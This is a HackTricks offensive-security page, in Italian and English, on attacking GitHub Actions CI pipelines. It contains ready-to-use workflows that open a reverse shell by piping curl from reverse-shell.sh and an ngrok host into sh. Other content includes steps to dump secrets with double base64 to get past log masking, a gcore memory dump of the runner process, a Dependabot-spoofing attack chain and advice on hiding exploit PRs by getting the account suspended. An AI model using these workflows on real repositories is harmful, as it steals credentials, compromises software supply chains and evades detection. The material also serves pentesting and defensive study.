# Abusare di Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Strumenti

The following tools are useful to find Github Action workflows and even find vulnerable ones:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Check also its checklist in [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Informazioni di base

In questa pagina troverai:

- Un **sommario di tutti gli impatti** di un attacker che riesce ad accedere a una Github Action
- Diversi modi per **ottenere accesso a una Github Action**:
- Avere **permessi** per creare l'action
- Abusare dei trigger relativi ai **pull request**
- Abusare di **altre tecniche di accesso esterno**
- **Pivoting** da un repo già compromesso
- Infine, una sezione sulle **tecniche di post-exploitation per abusare di una action dall'interno** (causare gli impatti menzionati)

## Riepilogo degli impatti

Per un'introduzione su [**Github Actions, consulta le informazioni di base**](../basic-github-information.md#github-actions).

Se puoi **eseguire codice arbitrario in GitHub Actions** all'interno di un **repository**, potresti essere in grado di:

- Rubare secrets montati nella pipeline e abusare dei privilegi della pipeline per ottenere accesso non autorizzato a piattaforme esterne, come AWS e GCP.
- Compromettere deployments e altri artifacts.
- Se la pipeline deploya o immagazzina asset, potresti alterare il prodotto finale, abilitando un attacco alla supply chain.
- Eseguire codice in custom workers per abusare della potenza di calcolo e pivotare verso altri sistemi.
- Sovrascrivere il codice del repository, a seconda dei permessi associati con il `GITHUB_TOKEN`.

## GITHUB_TOKEN

This "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) is given when the admin enables this option:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

This token is the same one a **Github Application will use**, so it can access the same endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github should release a [**flow**](https://github.com/github/roadmap/issues/74) that **allows cross-repository** access within GitHub, so a repo can access other internal repos using the `GITHUB_TOKEN`.

You can see the possible **permissions** of this token in: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Note that the token **expires after the job has completed**.\
These tokens looks like this: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Some interesting things you can do with this token:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Nota che in diverse occasioni potrai trovare **github user tokens inside Github Actions envs or in the secrets**. Questi token possono darti più privilegi sul repository e sull'organization.

<details>

<summary>Elenca i secrets nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni reverse shell con secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

È possibile verificare i permessi concessi a un Github Token nei repository di altri utenti **controllando i log** delle actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Esecuzione consentita

> [!NOTE]
> Questo sarebbe il modo più semplice per compromettere Github actions, poiché in questo caso si presuppone che tu abbia accesso a **create a new repo in the organization**, o che tu abbia **write privileges over a repository**.
>
> Se ti trovi in questo scenario puoi semplicemente consultare i [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action).

### Esecuzione tramite creazione del repo

Nel caso in cui i membri di un organization possano **create new repos** e tu possa eseguire github actions, puoi **create a new repo and steal the secrets set at organization level**.

### Esecuzione da un nuovo branch

Se puoi **create a new branch in a repository that already contains a Github Action** configurato, puoi **modify** it, **upload** the content, e poi **execute that action from the new branch**. In questo modo puoi **exfiltrate repository and organization level secrets** (ma devi sapere come si chiamano).

> [!WARNING]
> Qualsiasi restrizione implementata solo all'interno del workflow YAML (per esempio, `on: push: branches: [main]`, job conditionals, or manual gates) può essere modificata dai collaboratori. Senza enforcement esterno (branch protections, protected environments, and protected tags), un contributor può retargetare un workflow per farlo girare sul proprio branch e abusare dei mounted secrets/permissions.

Puoi rendere l'action modificata eseguibile **manualmente,** quando viene **creato un PR** o quando **viene pushato del codice** (a seconda di quanto vuoi essere rumoroso):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Esecuzione da fork

> [!NOTE]
> Esistono diversi trigger che potrebbero permettere a un attacker di **eseguire una Github Action di un altro repository**. Se queste azioni triggerabili sono configurate male, un attacker potrebbe riuscire a comprometterle.

### `pull_request`

Il workflow trigger **`pull_request`** eseguirà il workflow ogni volta che viene ricevuta una pull request con alcune eccezioni: per default, se è la **prima volta** che stai **collaborando**, alcuni **maintainer** dovranno **approvare** l'**esecuzione** del workflow:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Poiché la **limitazione di default** riguarda i contributori alla **prima partecipazione**, potresti contribuire **correggendo un bug/typo valido** e poi inviare **altre PR per abusare dei nuovi `pull_request` privilegi**.
>
> **L'ho testato e non funziona**: ~~Un'altra opzione sarebbe creare un account con il nome di qualcuno che ha contribuito al progetto e cancellare il suo account.~~

Inoltre, per default **vengono impediti i permessi di scrittura** e **l'accesso ai secrets** del repository di destinazione come indicato nei [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Un attacker potrebbe modificare la definizione della Github Action per eseguire azioni arbitrarie e aggiungere azioni arbitrarie. Tuttavia, non sarà in grado di rubare secrets o sovrascrivere il repo a causa delle limitazioni menzionate.

> [!CAUTION]
> **Sì, se l'attacker modifica nella PR la github action che verrà attivata, la sua Github Action sarà quella usata e non quella del repo di origine!**

Poiché l'attacker controlla anche il codice eseguito, anche se non ci sono secrets o permessi di scrittura sul `GITHUB_TOKEN`, un attacker potrebbe ad esempio **caricare artefatti malevoli**.

### **`pull_request_target`**

Il workflow trigger **`pull_request_target`** ha **permessi di scrittura** sul repository di destinazione e **accesso ai secrets** (e non richiede autorizzazione).

Nota che il workflow trigger **`pull_request_target`** **gira nel contesto base** e non in quello fornito dalla PR (per **non eseguire codice non attendibile**). Per maggiori info su `pull_request_target` [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Inoltre, per maggiori dettagli su questo uso particolarmente pericoloso controlla questo [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Potrebbe sembrare che, dato che il **workflow eseguito** è quello definito nella **base** e **non nella PR**, sia **sicuro** usare **`pull_request_target`**, ma ci sono **alcuni casi in cui non lo è**.

E questo avrà **accesso ai secrets**.

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger allows to run a workflow from a different one when it's `completed`, `requested` or `in_progress`.

In questo esempio, un workflow è configurato per essere eseguito dopo che il workflow separato "Run Tests" è completato:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

Questo tipo di workflow può essere attaccato se dipende da un **workflow** che può essere **triggered** da un utente esterno tramite **`pull_request`** o **`pull_request_target`**. Un paio di esempi vulnerabili possono essere [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Il primo consiste nel workflow triggerato da **`workflow_run`** che scarica il codice dell'attaccante: `${{ github.event.pull_request.head.sha }}`\
Il secondo consiste nel **passare** un **artifact** dal codice **untrusted** al workflow **`workflow_run`** e usare il contenuto di questo artifact in modo da renderlo **vulnerabile a RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

Abbiamo menzionato tutti i modi in cui un attaccante esterno potrebbe fare in modo che un GitHub workflow venga eseguito; ora vediamo come queste esecuzioni, se male configurate, possano essere abusate:

### Untrusted checkout execution

Nel caso di **`pull_request`**, il workflow verrà eseguito nel **contesto della PR** (quindi eseguirà il **codice maligno della PR**), ma qualcuno deve **autorizzarlo prima** e verrà eseguito con alcune [limitazioni](#pull_request).

Nel caso di un workflow che utilizza **`pull_request_target` or `workflow_run`** e che dipende da un workflow che può essere triggerato da **`pull_request_target` o `pull_request`**, verrà eseguito il codice del repo originale, quindi **l'attaccante non può controllare il codice eseguito**.

> [!CAUTION]
> Tuttavia, se l'**action** ha un **explicit PR checkout** che andrà a **prendere il codice dalla PR** (e non dal base), userà il codice controllato dall'attaccante. Per esempio (controlla la linea 12 dove il codice della PR viene scaricato):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Il codice potenzialmente **untrusted viene eseguito durante `npm install` o `npm build`** poiché gli script di build e i **packages** referenziati sono controllati dall'autore della PR.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Nota che esistono certi [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) i cui valori sono **controllati** dall'**utente** che crea la PR. Se la github action sta usando quei **dati per eseguire qualsiasi cosa**, potrebbe portare a **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Dalla documentazione: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

Se un attaccante potesse **iniettare qualsiasi valore** dentro questa variabile **env**, potrebbe iniettare variabili d'ambiente che possono eseguire codice nelle step successive come **LD_PRELOAD** o **NODE_OPTIONS**.

Per esempio ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), immagina un workflow che si fida di un artifact caricato per memorizzarne il contenuto dentro la variabile **`GITHUB_ENV`**. Un attaccante potrebbe caricare qualcosa del genere per comprometterlo:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Come indicato in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), diverse organizzazioni hanno una GitHub Action che effettua il merge di qualsiasi PRR da `dependabot[bot]` come in:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Questo è un problema perché il campo `github.actor` contiene l'utente che ha causato l'ultimo evento che ha attivato il workflow. Ci sono diversi modi per indurre l'utente `dependabot[bot]` a modificare una PR. Per esempio:

- Fare il fork del repository della vittima
- Aggiungere il payload malevolo alla tua copia
- Abilitare Dependabot sul tuo fork aggiungendo una dipendenza obsoleta. Dependabot creerà un branch che risolve la dipendenza con codice malevolo.
- Aprire una Pull Request verso il repository della vittima da quel branch (la PR sarà creata dall'utente quindi ancora nulla accadrà)
- Poi, l'attaccante torna alla PR iniziale che Dependabot ha aperto nel suo fork e esegue `@dependabot recreate`
- Quindi, Dependabot esegue alcune azioni su quel branch, che modificano la PR nel repository della vittima, il che rende `dependabot[bot]` l'actor dell'ultimo evento che ha attivato il workflow (e quindi, il workflow viene eseguito).

Proseguendo, cosa succede se invece di eseguire il merge la Github Action contenesse una command injection come in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, il post del blog originale propone due opzioni per abusare di questo comportamento, essendo la seconda:

- Fare il fork del repository della vittima e abilitare Dependabot con una dipendenza obsoleta.
- Creare un nuovo branch contenente il codice di shell injection maligno.
- Cambiare il default branch del repo su quello.
- Creare una PR da questo branch verso il repository della vittima.
- Eseguire `@dependabot merge` nella PR che Dependabot ha aperto nel suo fork.
- Dependabot unirà le sue modifiche nel default branch del tuo repository forkato, aggiornando la PR nel repository della vittima e rendendo `dependabot[bot]` l'attore dell'ultimo evento che ha attivato il workflow, usando un nome di branch maligno.

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), questa Github Action permette di accedere ad artifacts da workflow diversi e persino da repository differenti.

Il problema è che se il parametro **`path`** non è impostato, l'artifact viene estratto nella directory corrente e può sovrascrivere file che potrebbero essere poi usati o addirittura eseguiti nel workflow. Pertanto, se l'Artifact è vulnerabile, un attaccante potrebbe abusarne per compromettere altri workflow che si fidano dell'Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Questo potrebbe essere attaccato con questo workflow:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Altri Accessi Esterni

### Deleted Namespace Repo Hijacking

Se un account cambia il suo nome, un altro utente potrebbe registrare un account con lo stesso nome dopo un certo periodo. Se una repository aveva **less than 100 stars previously to the change of nam**e, Github permetterà al nuovo utente registrato con lo stesso nome di creare una **repository with the same name** di quella cancellata.

> [!CAUTION]
> Quindi se un action sta usando un repo di un account inesistente, è comunque possibile che un attacker possa creare quell'account e compromettere l'action.

Se altre repository usavano **dependencies from this user repos**, un attacker sarà in grado di hijackarle. Qui trovi una spiegazione più completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> In questa sezione parleremo delle tecniche che permettono di **pivot from one repo to another** supponendo di avere qualche tipo di accesso al primo (vedi la sezione precedente).

### Cache Poisoning

Una cache viene mantenuta tra **wokflow runs in the same branch**. Ciò significa che se un attacker riesce a **compromise** un **package** che viene poi memorizzato nella cache e **downloaded** ed eseguito da un workflow **more privileged**, potrà **compromise** anche quel workflow.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

I workflow possono usare **artifacts from other workflows and even repos**; se un attacker riesce a **compromise** la Github Action che **uploads an artifact** che viene poi utilizzata da un altro workflow, potrebbe **compromise the other workflows**:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

Come commentato in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), anche se una repository o organizzazione ha una policy che restringe l'uso di certe actions, un attacker potrebbe semplicemente clonare (`git clone`) un action dentro il workflow e poi referenziarlo come local action. Poiché le policies non influenzano i percorsi locali, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### Accesso ad AWS e GCP via OIDC

Consulta le seguenti pagine:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Accessing secrets <a href="#accessing-secrets" id="accessing-secrets"></a>

Se stai iniettando contenuto in uno script, è utile sapere come puoi accedere ai secrets:

- Se il secret o token è impostato come **environment variable**, può essere direttamente accessibile dall'ambiente usando **`printenv`**.

<details>

<summary>Elencare i secrets nell'output di Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Ottieni una reverse shell usando secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Se il secret è usato **direttamente in un'espressione**, lo script shell generato viene memorizzato **on-disk** ed è accessibile.
- ```bash
cat /home/runner/work/_temp/*
```
- Per una action JavaScript i secrets vengono inviati tramite variabili d'ambiente
- ```bash
ps axe | grep node
```
- Per una **custom action**, il rischio può variare a seconda di come un programma usa il secret ottenuto dall'**argomento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- Enumerare tutti i secrets tramite il secrets context (livello collaborator). Un contributor con accesso in scrittura può modificare un workflow su qualsiasi branch per estrarre tutti i secrets del repository/org/environment. Usa doppio base64 per evadere il log masking di GitHub e decodifica localmente:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Decodifica localmente:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

Suggerimento: per maggiore stealth durante i test, cifra prima di stampare (openssl è preinstallato sui GitHub-hosted runners).

### Abuso dei Self-hosted runners

Il modo per trovare quali **Github Actions vengono eseguite in infrastrutture non-github** è cercare **`runs-on: self-hosted`** nella configurazione yaml di Github Action.

**Self-hosted** runners potrebbero avere accesso a **informazioni sensibili aggiuntive**, ad altri **sistemi di rete** (endpoint vulnerabili nella rete? metadata service?) oppure, anche se sono isolati e distrutti, **più di una action potrebbe essere eseguita contemporaneamente** e quella malevola potrebbe rubare i secrets dell'altra.

Nei self-hosted runners è anche possibile ottenere i **secrets from the \_Runner.Listener**\_\*\* process\*\* che conterrà tutti i secrets dei workflow in qualsiasi step effettuando il dump della sua memoria:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro immagini Docker di Github

È possibile creare Github actions che **creano e memorizzano un'immagine Docker all'interno di Github**.\
Un esempio può essere trovato nel seguente elemento espandibile:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Come puoi vedere nel codice precedente, il Github registry è ospitato in **`ghcr.io`**.

Un utente con permessi di lettura sul repo potrà quindi scaricare la Docker Image usando un token di accesso personale:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Poi, l'utente potrebbe cercare **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Informazioni sensibili nei logs di Github Actions

Anche se **Github** prova a **rilevare valori segreti** nei logs di Github Actions e a **non mostrarli**, **altri dati sensibili** che potrebbero essere stati generati durante l'esecuzione dell'action non verranno nascosti. Ad esempio un JWT firmato con un valore segreto non verrà nascosto a meno che non sia [specificamente configurato](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Coprire le tue tracce

(Tecnica da [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prima di tutto, qualsiasi PR aperta è chiaramente visibile al pubblico su Github e all'account GitHub bersaglio. In GitHub, per impostazione predefinita, **non possiamo eliminare una PR da Internet**, ma c'è un colpo di scena. Per gli account Github che vengono **sospesi** da Github, tutte le loro **PR vengono automaticamente eliminate** e rimosse da Internet. Quindi, per nascondere la tua attività devi o **far sospendere il tuo account GitHub** o **far segnalare il tuo account**. Questo **nasconderebbe tutte le tue attività** su GitHub da Internet (praticamente rimuovendo tutte le exploit PR)

Un'organizzazione su GitHub è molto proattiva nel segnalare account a GitHub. Tutto quello che devi fare è condividere “some stuff” in un Issue e loro faranno in modo che il tuo account venga sospeso entro 12 ore :p e così hai reso il tuo exploit invisibile su github.

> [!WARNING]
> L'unico modo per un'organizzazione di capire di essere stata presa di mira è controllare i log di GitHub dal SIEM, poiché dall'interfaccia di GitHub la PR verrebbe rimossa.

## Riferimenti

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
